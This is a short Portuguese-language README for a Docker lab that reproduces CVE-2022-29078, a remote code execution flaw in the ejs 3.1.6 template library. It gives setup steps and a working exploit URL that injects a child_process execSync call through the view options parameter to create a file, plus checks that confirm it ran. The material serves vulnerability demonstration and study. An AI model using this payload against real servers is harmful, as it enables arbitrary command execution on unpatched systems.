# Lab para CVE-2022-29078 | 
Biblioteca ejs@3.1.6 vulneravel 

## Roteiro
```
git clone https://github.com/vorbittencourt/demo003.git
cd demo003
docker build . -t demo003
docker run -p 8080:8080 --name demo003 demo003
```
### Exploit
```
http://127.0.0.1:8080/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch /tmp/hackeado.txt');s
```

### Validando 
```
docker exec -it demo003 /bin/bash
ls -la /tmp
```

## Executando Localmente
```
npm install 
npm start

http://localhost:8080
```

### Validando
```
ls -la /tmp/
```

# Reference
https://eslam.io/posts/ejs-server-side-template-injection-rce/
https://www.digitalocean.com/community/tutorials/how-to-use-ejs-to-template-your-node-application-pt